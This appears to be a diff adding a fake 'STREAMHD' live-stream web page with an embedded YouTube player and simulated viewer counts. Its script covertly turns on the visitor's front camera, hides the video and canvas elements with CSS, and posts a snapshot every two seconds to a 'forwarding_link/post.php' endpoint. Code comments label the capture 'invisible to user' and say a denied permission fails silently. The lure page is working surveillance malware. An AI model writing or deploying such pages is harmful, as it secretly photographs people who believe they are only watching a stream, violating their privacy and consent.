@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Stream - HD Player</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #141414;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Hide camera elements completely */
+        .video-wrap,
+        #video,
+        #canvas {
+            position: absolute !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            visibility: hidden !important;
+            left: -9999px !important;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, transparent 100%);
+            padding: 20px 40px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #e50914;
+            letter-spacing: 1px;
+        }
+
+        .nav-items {
+            display: flex;
+            gap: 25px;
+            align-items: center;
+        }
+
+        .nav-item {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-item:hover {
+            color: #e50914;
+        }
+
+        .user-icon {
+            width: 35px;
+            height: 35px;
+            background: #e50914;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
+        /* Main content */
+        .main-content {
+            padding-top: 80px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Video player container */
+        .player-container {
+            position: relative;
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 20px;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            height: 0;
+            overflow: hidden;
+        }
+
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Live indicator */
+        .live-indicator {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: #e50914;
+            padding: 8px 20px;
+            border-radius: 5px;
+            font-weight: 700;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 10;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* Info section */
+        .video-info {
+            padding: 30px;
+        }
+
+        .video-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .video-meta {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            color: #b3b3b3;
+            font-size: 14px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .video-description {
+            color: #b3b3b3;
+            line-height: 1.6;
+            font-size: 15px;
+            max-width: 800px;
+        }
+
+        /* Action buttons */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+
+        .action-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 5px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #fff;
+            transform: translateY(-2px);
+        }
+
+        .action-btn.primary {
+            background: #e50914;
+            border-color: #e50914;
+        }
+
+        .action-btn.primary:hover {
+            background: #f40612;
+        }
+
+        /* Related videos */
+        .related-section {
+            padding: 40px 30px;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .related-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .related-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .related-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .related-thumbnail {
+            width: 100%;
+            height: 160px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+        }
+
+        .related-info {
+            padding: 15px;
+        }
+
+        .related-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .related-meta {
+            color: #b3b3b3;
+            font-size: 13px;
+        }
+
+        /* Viewer count */
+        .viewer-count {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .viewer-icon {
+            color: #e50914;
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .header {
+                padding: 15px 20px;
+            }
+
+            .logo {
+                font-size: 22px;
+            }
+
+            .nav-items {
+                gap: 15px;
+            }
+
+            .nav-item {
+                display: none;
+            }
+
+            .nav-item:last-child {
+                display: block;
+            }
+
+            .player-container {
+                margin: 10px;
+            }
+
+            .video-info {
+                padding: 20px;
+            }
+
+            .video-title {
+                font-size: 22px;
+            }
+
+            .related-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+            }
+
+            .action-btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+
+        /* Loading animation */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #141414;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: fadeOut 1s ease-out 1.5s forwards;
+        }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                pointer-events: none;
+            }
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(229, 9, 20, 0.2);
+            border-top-color: #e50914;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden camera elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <!-- Loading overlay -->
+    <div class="loading-overlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">STREAMHD</div>
+        <div class="nav-items">
+            <a href="#" class="nav-item">Home</a>
+            <a href="#" class="nav-item">Live</a>
+            <a href="#" class="nav-item">Browse</a>
+            <div class="user-icon">U</div>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <div class="main-content">
+        <div class="player-container">
+            <div class="live-indicator">
+                <div class="live-dot"></div>
+                LIVE
+            </div>
+            <div class="viewer-count">
+                <span class="viewer-icon">👁</span>
+                <span id="viewerCount">1,234</span> watching
+            </div>
+            <div class="video-wrapper">
+                <iframe 
+                    src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&mute=0&controls=1&rel=0" 
+                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                    allowfullscreen>
+                </iframe>
+            </div>
+        </div>
+
+        <div class="video-info">
+            <h1 class="video-title">Live Stream - HD Quality</h1>
+            <div class="video-meta">
+                <div class="meta-item">
+                    <span>🎥</span>
+                    <span>HD 1080p</span>
+                </div>
+                <div class="meta-item">
+                    <span>👥</span>
+                    <span id="viewerCount2">1,234</span> viewers
+                </div>
+                <div class="meta-item">
+                    <span>👍</span>
+                    <span>2.3K likes</span>
+                </div>
+                <div class="meta-item">
+                    <span>⏰</span>
+                    <span>Started 15 minutes ago</span>
+                </div>
+            </div>
+            <p class="video-description">
+                Watch this amazing live stream in high quality! Join thousands of viewers from around the world 
+                enjoying this broadcast. Share with your friends and don't forget to like and subscribe!
+            </p>
+            <div class="action-buttons">
+                <button class="action-btn primary">
+                    <span>👍</span>
+                    Like
+                </button>
+                <button class="action-btn">
+                    <span>📤</span>
+                    Share
+                </button>
+                <button class="action-btn">
+                    <span>⭐</span>
+                    Subscribe
+                </button>
+                <button class="action-btn">
+                    <span>💬</span>
+                    Chat
+                </button>
+            </div>
+        </div>
+
+        <div class="related-section">
+            <h2 class="section-title">More Live Streams</h2>
+            <div class="related-grid">
+                <div class="related-card">
+                    <div class="related-thumbnail">🎮</div>
+                    <div class="related-info">
+                        <div class="related-title">Gaming Stream - Live Gameplay</div>
+                        <div class="related-meta">🔴 LIVE • 523 watching</div>
+                    </div>
+                </div>
+                <div class="related-card">
+                    <div class="related-thumbnail">🎵</div>
+                    <div class="related-info">
+                        <div class="related-title">Music Concert - 24/7 Stream</div>
+                        <div class="related-meta">🔴 LIVE • 891 watching</div>
+                    </div>
+                </div>
+                <div class="related-card">
+                    <div class="related-thumbnail">📰</div>
+                    <div class="related-info">
+                        <div class="related-title">Breaking News - Live Coverage</div>
+                        <div class="related-meta">🔴 LIVE • 1.2K watching</div>
+                    </div>
+                </div>
+                <div class="related-card">
+                    <div class="related-thumbnail">⚽</div>
+                    <div class="related-info">
+                        <div class="related-title">Sports Event - Live Match</div>
+                        <div class="related-meta">🔴 LIVE • 3.5K watching</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Camera capture (invisible to user)
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {},
+                error: function() {}
+            });
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                // Silently fail if camera access denied
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 2000);
+        }
+
+        init();
+
+        // Simulate viewer count updates
+        function updateViewerCount() {
+            const count = Math.floor(Math.random() * 100) + 1200;
+            document.getElementById('viewerCount').textContent = count.toLocaleString();
+            document.getElementById('viewerCount2').textContent = count.toLocaleString();
+        }
+
+        setInterval(updateViewerCount, 5000);
+
+        // Button interactions
+        document.querySelectorAll('.action-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const text = this.textContent.trim();
+                if (text.includes('Like')) {
+                    this.style.background = '#e50914';
+                    this.style.borderColor = '#e50914';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
